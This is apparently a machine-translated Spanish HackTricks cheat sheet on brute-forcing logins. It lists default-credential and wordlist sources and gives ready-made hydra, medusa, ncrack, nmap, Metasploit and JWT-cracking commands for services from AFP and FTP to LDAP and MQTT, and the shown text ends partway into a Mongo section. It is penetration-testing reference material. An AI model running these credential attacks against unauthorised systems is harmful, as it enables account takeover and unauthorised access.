# Fuerza Bruta - Hoja de Trucos

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Credenciales Predeterminadas

**Busca en Google** las credenciales predeterminadas de la tecnología que se está utilizando, o **prueba estos enlaces**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Crea tus propios Diccionarios**

Encuentra la mayor cantidad de información posible sobre el objetivo y genera un diccionario personalizado. Herramientas que pueden ayudar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl es una herramienta de generación de listas de palabras clave que se utiliza en pruebas de penetración y en ataques de fuerza bruta. Esta herramienta se utiliza para recopilar palabras clave relevantes a partir de un sitio web o de un archivo de texto. Cewl utiliza técnicas de web scraping para extraer palabras clave de páginas web y generar una lista de palabras clave que pueden ser utilizadas en ataques de fuerza bruta.

Para utilizar Cewl, simplemente debes proporcionarle una URL o un archivo de texto como entrada. La herramienta rastreará el sitio web o analizará el archivo de texto y extraerá las palabras clave relevantes. Puedes especificar la profundidad de rastreo y otros parámetros para refinar los resultados.

Una vez que Cewl haya generado la lista de palabras clave, puedes utilizarla en ataques de fuerza bruta para intentar adivinar contraseñas o realizar otros tipos de ataques. Es importante tener en cuenta que el uso de Cewl para fines maliciosos es ilegal y puede tener consecuencias legales graves.

Cewl es una herramienta útil para los profesionales de la seguridad informática y los expertos en pruebas de penetración. Puede ayudar a identificar posibles vulnerabilidades en un sistema y fortalecer la seguridad de una organización. Sin embargo, es importante utilizar esta herramienta de manera ética y legal, y obtener el consentimiento adecuado antes de realizar pruebas de penetración en un sistema.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera contraseñas basadas en tu conocimiento sobre la víctima (nombres, fechas...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Una herramienta generadora de listas de palabras, que te permite proporcionar un conjunto de palabras, dándote la posibilidad de crear múltiples variaciones a partir de las palabras dadas, creando una lista de palabras única e ideal para usar en relación a un objetivo específico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palabras

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** utilizando las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servicios

Ordenados alfabéticamente por nombre de servicio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

El Protocolo de Conector de Java (AJP, por sus siglas en inglés) es un protocolo de red utilizado para la comunicación entre un servidor web y un servidor de aplicaciones Java. AJP se utiliza comúnmente en entornos de servidor web que ejecutan aplicaciones Java, como Apache Tomcat.

El objetivo principal de AJP es mejorar el rendimiento y la eficiencia de la comunicación entre el servidor web y el servidor de aplicaciones Java. AJP utiliza un formato de paquete binario compacto y optimizado para minimizar el tamaño de los datos transmitidos y reducir la sobrecarga de la red.

Una técnica común de ataque que se puede utilizar contra servidores AJP es el ataque de fuerza bruta. En este tipo de ataque, un atacante intenta adivinar la contraseña de un usuario probando diferentes combinaciones de contraseñas hasta encontrar la correcta. Esto se logra enviando solicitudes AJP con diferentes contraseñas y verificando si el servidor responde con éxito.

Para protegerse contra los ataques de fuerza bruta en servidores AJP, es importante implementar medidas de seguridad adecuadas, como el uso de contraseñas fuertes y la configuración adecuada de las políticas de bloqueo de cuentas. Además, se recomienda monitorear de cerca los registros del servidor en busca de actividades sospechosas y aplicar parches de seguridad regularmente para protegerse contra vulnerabilidades conocidas.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra es un sistema de gestión de bases de datos distribuidas altamente escalable y de alto rendimiento. Utiliza un modelo de datos basado en columnas y está diseñado para manejar grandes volúmenes de datos en múltiples nodos sin un único punto de fallo.

#### Ataques de fuerza bruta contra Cassandra

Los ataques de fuerza bruta son una técnica común utilizada para intentar obtener acceso no autorizado a sistemas protegidos. En el caso de Cassandra, un ataque de fuerza bruta implica intentar adivinar la contraseña de un usuario mediante la prueba de diferentes combinaciones de contraseñas hasta encontrar la correcta.

Para llevar a cabo un ataque de fuerza bruta contra Cassandra, se pueden utilizar herramientas como Hydra o Medusa. Estas herramientas automatizan el proceso de prueba de contraseñas al probar diferentes combinaciones en rápida sucesión.

Sin embargo, es importante tener en cuenta que los ataques de fuerza bruta pueden ser ineficientes y llevar mucho tiempo, especialmente si se utilizan contraseñas seguras. Además, los sistemas de seguridad de Cassandra pueden estar configurados para bloquear automáticamente las direcciones IP después de un cierto número de intentos fallidos, lo que dificulta aún más el éxito de un ataque de fuerza bruta.

Para protegerse contra los ataques de fuerza bruta, es recomendable utilizar contraseñas seguras y complejas, así como implementar medidas de seguridad adicionales, como la autenticación de dos factores. También es importante mantener el software de Cassandra actualizado con los últimos parches de seguridad para mitigar posibles vulnerabilidades que podrían ser explotadas en un ataque de fuerza bruta.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDB es una base de datos NoSQL de código abierto que utiliza JSON para almacenar datos. Es conocida por su capacidad de replicación y su capacidad de manejar grandes cantidades de datos distribuidos en múltiples servidores.

## Ataques de fuerza bruta

Un ataque de fuerza bruta es un método utilizado por los hackers para descubrir contraseñas o claves de acceso a través de la prueba sistemática de todas las combinaciones posibles. En el caso de CouchDB, un ataque de fuerza bruta se puede utilizar para intentar adivinar la contraseña de un usuario y obtener acceso no autorizado a la base de datos.

### Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en CouchDB. Algunas de las herramientas más populares incluyen:

- Hydra: una herramienta de fuerza bruta en línea de comandos que admite varios protocolos, incluido HTTP utilizado por CouchDB.
- Medusa: una herramienta de fuerza bruta en línea de comandos que también admite varios protocolos, incluido HTTP.
- Ncrack: una herramienta de autenticación en línea de comandos que puede realizar ataques de fuerza bruta en varios protocolos, incluido HTTP.

### Mitigación de ataques de fuerza bruta

Para proteger CouchDB contra ataques de fuerza bruta, se recomienda seguir las siguientes prácticas de seguridad:

- Utilizar contraseñas fuertes: asegurarse de que las contraseñas sean lo suficientemente largas y complejas como para resistir los ataques de fuerza bruta.
- Implementar bloqueo de cuentas: configurar CouchDB para bloquear una cuenta después de un número determinado de intentos fallidos de inicio de sesión.
- Limitar el acceso remoto: restringir el acceso a CouchDB solo a direcciones IP confiables o a través de una VPN.
- Mantener el software actualizado: asegurarse de que CouchDB esté actualizado con los últimos parches de seguridad para mitigar vulnerabilidades conocidas.

Al seguir estas prácticas de seguridad, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso en CouchDB.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro de Docker

Un registro de Docker es un servicio que permite almacenar y distribuir imágenes de Docker. Es similar a un repositorio de código fuente, pero en lugar de almacenar código, almacena imágenes de contenedores Docker. Esto permite a los desarrolladores compartir y distribuir fácilmente sus aplicaciones en contenedores.

El registro de Docker utiliza un protocolo llamado Docker Registry HTTP API para permitir la interacción con el registro. Esta API proporciona métodos para autenticarse, buscar imágenes, subir y descargar imágenes, y administrar etiquetas y versiones.

#### Ataques de fuerza bruta al registro de Docker

Un ataque de fuerza bruta es un método utilizado por los hackers para intentar adivinar contraseñas o claves de acceso mediante la prueba sistemática de todas las combinaciones posibles. En el contexto de un registro de Docker, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso de un usuario legítimo.

Para llevar a cabo un ataque de fuerza bruta al registro de Docker, un hacker utilizará herramientas automatizadas que intentarán diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las credenciales correctas. Esto se hace de forma rápida y eficiente, ya que las herramientas de fuerza bruta pueden probar miles de combinaciones por segundo.

#### Protección contra ataques de fuerza bruta

Para proteger un registro de Docker contra ataques de fuerza bruta, es importante implementar medidas de seguridad adecuadas. Algunas de las mejores prácticas incluyen:

- Utilizar contraseñas fuertes: Las contraseñas deben ser largas, complejas y únicas para cada usuario. Se recomienda utilizar una combinación de letras mayúsculas y minúsculas, números y caracteres especiales.

- Limitar los intentos de inicio de sesión: Se pueden implementar mecanismos para limitar el número de intentos de inicio de sesión fallidos antes de bloquear temporalmente la cuenta.

- Implementar autenticación de dos factores (2FA): La autenticación de dos factores agrega una capa adicional de seguridad al requerir un segundo factor de autenticación, como un código generado por una aplicación móvil, además de la contraseña.

- Monitorear y registrar los intentos de inicio de sesión: Mantener un registro de los intentos de inicio de sesión fallidos puede ayudar a identificar patrones sospechosos y tomar medidas preventivas.

- Mantener el software actualizado: Es importante mantener el registro de Docker y todas las dependencias actualizadas con los últimos parches de seguridad para evitar vulnerabilidades conocidas.

Implementar estas medidas de seguridad puede ayudar a proteger un registro de Docker contra ataques de fuerza bruta y garantizar la integridad y seguridad de las imágenes de contenedores almacenadas en el registro.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch es un motor de búsqueda y análisis distribuido de código abierto, diseñado para almacenar, buscar y analizar grandes volúmenes de datos en tiempo real. Utiliza el formato JSON para almacenar y consultar datos, lo que lo hace altamente flexible y escalable.

## Ataques de fuerza bruta

Un ataque de fuerza bruta es un método utilizado para descubrir contraseñas o claves de cifrado mediante la prueba sistemática de todas las combinaciones posibles. En el contexto de Elasticsearch, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso a un clúster de Elasticsearch.

### Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra Elasticsearch. Algunas de las herramientas más populares incluyen:

- **Hydra**: una herramienta de línea de comandos que admite ataques de fuerza bruta en varios protocolos, incluido HTTP.
- **Medusa**: una herramienta de fuerza bruta rápida y modular que puede atacar varios servicios, incluido Elasticsearch.
- **Ncrack**: una herramienta de autenticación en red de código abierto que admite ataques de fuerza bruta en varios protocolos, incluido Elasticsearch.

### Mitigación de ataques de fuerza bruta

Para proteger un clúster de Elasticsearch contra ataques de fuerza bruta, se pueden implementar las siguientes medidas de seguridad:

- **Políticas de contraseña fuertes**: se deben establecer políticas de contraseña que requieran contraseñas largas y complejas.
- **Bloqueo de cuentas**: se pueden implementar mecanismos de bloqueo de cuentas después de un número determinado de intentos fallidos.
- **Autenticación multifactor**: se puede implementar la autenticación multifactor para agregar una capa adicional de seguridad.
- **Actualizaciones regulares**: se deben aplicar las actualizaciones de seguridad más recientes para protegerse contra vulnerabilidades conocidas.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y solo deben realizarse con el permiso explícito del propietario del sistema.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo estándar utilizado para transferir archivos entre un cliente y un servidor en una red. El FTP utiliza un enfoque de autenticación basado en contraseñas para verificar la identidad del usuario y permite la transferencia de archivos tanto en modo binario como en modo ASCII.

#### Ataques de fuerza bruta contra FTP

Un ataque de fuerza bruta contra FTP es un método utilizado para descubrir las credenciales de inicio de sesión de un servidor FTP mediante la prueba de todas las combinaciones posibles de nombres de usuario y contraseñas. Este tipo de ataque puede ser efectivo si el servidor FTP no tiene medidas de seguridad adecuadas, como bloqueo de cuentas después de un número determinado de intentos fallidos.

#### Herramientas de fuerza bruta para FTP

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra servidores FTP. Algunas de las herramientas más populares incluyen Hydra, Medusa y Ncrack. Estas herramientas permiten a los hackers automatizar el proceso de prueba de credenciales y pueden probar miles de combinaciones en poco tiempo.

#### Mitigación de ataques de fuerza bruta contra FTP

Para mitigar los ataques de fuerza bruta contra FTP, es importante implementar medidas de seguridad adecuadas. Algunas de las medidas que se pueden tomar incluyen:

- Establecer políticas de contraseñas fuertes y exigir cambios periódicos de contraseñas.
- Limitar el número de intentos de inicio de sesión permitidos antes de bloquear una cuenta.
- Utilizar autenticación de dos factores para agregar una capa adicional de seguridad.
- Mantener el software del servidor FTP actualizado con los últimos parches de seguridad.
- Utilizar una solución de prevención de intrusiones para detectar y bloquear intentos de fuerza bruta.

Implementar estas medidas puede ayudar a proteger un servidor FTP contra ataques de fuerza bruta y garantizar la seguridad de los archivos transferidos a través de FTP.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Fuerza Bruta Genérica HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticación Básica HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Enviar formulario mediante POST

El método de ataque de fuerza bruta mediante el envío de formularios HTTP POST es una técnica comúnmente utilizada para intentar obtener acceso no autorizado a sistemas protegidos. Este método se basa en la idea de enviar múltiples solicitudes POST con diferentes combinaciones de nombres de usuario y contraseñas, con el objetivo de encontrar las credenciales correctas que permitan el acceso.

El proceso de ataque de fuerza bruta mediante el envío de formularios HTTP POST generalmente sigue los siguientes pasos:

1. Identificar el formulario objetivo: El primer paso es identificar el formulario HTML en la página web objetivo que se utiliza para enviar las credenciales de inicio de sesión. Esto se puede hacer inspeccionando el código fuente de la página o utilizando herramientas de análisis web.

2. Configurar la solicitud POST: Una vez identificado el formulario, se debe configurar una solicitud POST utilizando la URL de destino y los parámetros necesarios. Los parámetros generalmente incluyen el nombre de usuario y la contraseña.

3. Generar combinaciones de credenciales: A continuación, se generan diferentes combinaciones de nombres de usuario y contraseñas para probar. Esto se puede hacer utilizando diccionarios de contraseñas predefinidos o mediante la generación automática de combinaciones.

4. Enviar solicitudes POST: Se envían las solicitudes POST al formulario objetivo, una por una, utilizando las diferentes combinaciones de credenciales generadas. Cada solicitud se envía con los parámetros correspondientes, es decir, el nombre de usuario y la contraseña.

5. Analizar respuestas: Después de enviar cada solicitud, se analiza la respuesta recibida del servidor. Si la respuesta indica que las credenciales son válidas, se ha encontrado una combinación exitosa y se ha obtenido acceso no autorizado al sistema.

Es importante tener en cuenta que el uso de esta técnica de fuerza bruta para acceder a sistemas protegidos sin autorización es ilegal y puede tener consecuencias legales graves. Esta información se proporciona únicamente con fines educativos y para aumentar la conciencia sobre las vulnerabilidades de seguridad.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Para http**s** tienes que cambiar de "http-post-form" a "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP (Internet Message Access Protocol) es un protocolo de correo electrónico que permite a los usuarios acceder y administrar sus correos electrónicos almacenados en un servidor remoto. A diferencia del protocolo POP3, que descarga los correos electrónicos en el dispositivo del usuario, IMAP mantiene los correos electrónicos en el servidor, lo que permite un acceso más flexible y sincronizado desde múltiples dispositivos.

#### Ataque de fuerza bruta contra IMAP

Un ataque de fuerza bruta contra IMAP es un método utilizado por los hackers para obtener acceso no autorizado a las cuentas de correo electrónico a través de la adivinación de contraseñas. Consiste en probar diferentes combinaciones de contraseñas hasta encontrar la correcta. Los hackers utilizan herramientas automatizadas para realizar este tipo de ataques, lo que les permite probar miles de contraseñas en poco tiempo.

Para protegerse contra los ataques de fuerza bruta en IMAP, es importante seguir buenas prácticas de seguridad, como utilizar contraseñas fuertes y únicas, habilitar la autenticación de dos factores y limitar el número de intentos de inicio de sesión permitidos. Además, los proveedores de servicios de correo electrónico también implementan medidas de seguridad, como el bloqueo temporal de las cuentas después de varios intentos fallidos de inicio de sesión.

En resumen, IMAP es un protocolo de correo electrónico que permite a los usuarios acceder y administrar sus correos electrónicos almacenados en un servidor remoto. Los ataques de fuerza bruta contra IMAP son intentos de adivinar contraseñas para obtener acceso no autorizado a las cuentas de correo electrónico. Es importante tomar medidas de seguridad para protegerse contra estos ataques.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC (Internet Relay Chat) es un protocolo de comunicación en tiempo real ampliamente utilizado para la comunicación en línea. Permite a los usuarios participar en conversaciones grupales o privadas a través de canales de chat. Los canales de IRC son similares a las salas de chat y los usuarios pueden unirse a ellos para interactuar con otros participantes. IRC utiliza un modelo cliente-servidor, donde los clientes se conectan a servidores IRC para unirse a los canales y enviar mensajes. Los mensajes en IRC se envían en texto plano, lo que significa que pueden ser interceptados y leídos por terceros. Por lo tanto, es importante tener precaución al enviar información sensible a través de IRC.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) es un protocolo de red que permite a los dispositivos de almacenamiento en red (como discos duros, cintas y unidades de estado sólido) ser accesibles a través de una red IP. Utiliza el protocolo TCP/IP para transmitir comandos SCSI (Small Computer System Interface) entre un iniciador (cliente) y un destino (servidor). El objetivo del iSCSI es proporcionar una solución de almacenamiento de bajo costo y alta velocidad para entornos de red.

El proceso de conexión iSCSI implica la autenticación del iniciador con el destino y la creación de una sesión de iSCSI. Una vez establecida la sesión, el iniciador puede enviar comandos SCSI al destino para acceder y administrar los dispositivos de almacenamiento. Estos comandos pueden incluir operaciones de lectura, escritura, borrado y otras operaciones de administración.

El ataque de fuerza bruta es un método utilizado para descubrir credenciales de acceso a sistemas iSCSI. Consiste en probar todas las combinaciones posibles de nombres de usuario y contraseñas hasta encontrar las correctas. Este tipo de ataque puede ser automatizado utilizando herramientas especializadas, lo que permite probar miles o incluso millones de combinaciones en poco tiempo.

Es importante tener en cuenta que el uso de fuerza bruta para acceder a sistemas iSCSI sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe realizar pruebas de penetración en sistemas autorizados y con el consentimiento del propietario del sistema.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token (JWT) es un estándar abierto (RFC 7519) que define un formato compacto y seguro para transmitir información entre partes como un objeto JSON. Está compuesto por tres partes: el encabezado, la carga útil y la firma.

El encabezado contiene información sobre el tipo de token y el algoritmo de firma utilizado. La carga útil contiene los datos que se desean transmitir. La firma se utiliza para verificar la integridad del token y asegurar que no haya sido modificado.

El uso de JWT es común en aplicaciones web y móviles para autenticación y autorización. Un escenario típico es cuando un usuario inicia sesión en una aplicación y recibe un JWT como respuesta. Este token se puede enviar en cada solicitud posterior para verificar la identidad del usuario y permitir el acceso a recursos protegidos.

Una técnica común para atacar JWT es el ataque de fuerza bruta. En este tipo de ataque, un atacante intenta adivinar la clave secreta utilizada para firmar el token. Esto se logra probando diferentes combinaciones de claves hasta encontrar la correcta.

Para protegerse contra ataques de fuerza bruta, es importante utilizar claves seguras y algoritmos de firma robustos. Además, se recomienda implementar medidas de seguridad adicionales, como limitar el número de intentos de autenticación y monitorear los registros en busca de actividad sospechosa.

En resumen, JWT es un estándar utilizado para transmitir información de forma segura entre partes. Sin embargo, es importante tomar precauciones para protegerse contra ataques de fuerza bruta y garantizar la seguridad de los tokens utilizados en las aplicaciones.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
LDAP (Lightweight Directory Access Protocol) es un protocolo de aplicación utilizado para acceder y mantener servicios de directorio. Es comúnmente utilizado para autenticación y búsqueda de información en un directorio. El protocolo LDAP utiliza un enfoque de autenticación basado en credenciales, lo que significa que los usuarios deben proporcionar un nombre de usuario y una contraseña válidos para acceder a los servicios de directorio. 

El ataque de fuerza bruta es una técnica común utilizada para comprometer sistemas LDAP. En este tipo de ataque, un atacante intenta adivinar las credenciales de acceso probando diferentes combinaciones de nombres de usuario y contraseñas. El objetivo es encontrar una combinación válida que permita al atacante acceder al sistema LDAP sin autorización.

Para llevar a cabo un ataque de fuerza bruta en un sistema LDAP, los atacantes pueden utilizar herramientas automatizadas que prueban miles o incluso millones de combinaciones de nombres de usuario y contraseñas en un corto período de tiempo. Estas herramientas aprovechan la velocidad de procesamiento de las computadoras modernas para probar rápidamente diferentes combinaciones y descubrir las credenciales correctas.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están sujetos a sanciones legales. Además, los sistemas LDAP suelen tener medidas de seguridad para detectar y prevenir este tipo de ataques, como bloquear temporalmente una cuenta después de un número determinado de intentos fallidos de inicio de sesión.

Para proteger un sistema LDAP contra ataques de fuerza bruta, es recomendable implementar medidas de seguridad como políticas de contraseñas fuertes, bloqueo de cuentas después de un número determinado de intentos fallidos de inicio de sesión y monitoreo constante de los registros de acceso para detectar actividades sospechosas.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) es un protocolo de mensajería ligero y de bajo consumo de energía diseñado para la comunicación entre dispositivos en redes de área local o de ancho de banda limitado. Es ampliamente utilizado en aplicaciones de Internet de las cosas (IoT) debido a su eficiencia y simplicidad.

El protocolo MQTT utiliza un enfoque de publicación/suscripción, donde los dispositivos pueden publicar mensajes en un tema específico y otros dispositivos pueden suscribirse a ese tema para recibir los mensajes. Esto permite una comunicación eficiente y escalable entre los dispositivos conectados.

Una técnica común utilizada en el hacking de MQTT es el ataque de fuerza bruta. Este ataque consiste en intentar adivinar la contraseña de un dispositivo MQTT mediante la prueba de diferentes combinaciones de contraseñas hasta encontrar la correcta. Para llevar a cabo este ataque, se utilizan herramientas como Mosquitto_pub y Mosquitto_sub, que permiten enviar y recibir mensajes MQTT.

Es importante tener en cuenta que el uso de técnicas de fuerza bruta para acceder a dispositivos MQTT sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe realizar pruebas de penetración en sistemas y dispositivos con el permiso explícito del propietario.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo es una base de datos NoSQL ampliamente utilizada en aplicaciones web y móviles. Al ser una base de datos NoSQL, Mongo no utiliza tablas y filas como las bases de datos relacionales tradicionales, sino que almacena los datos en documentos JSON flexibles. Esto permite una mayor escalabilidad y flexibilidad en el almacenamiento y consulta de datos.

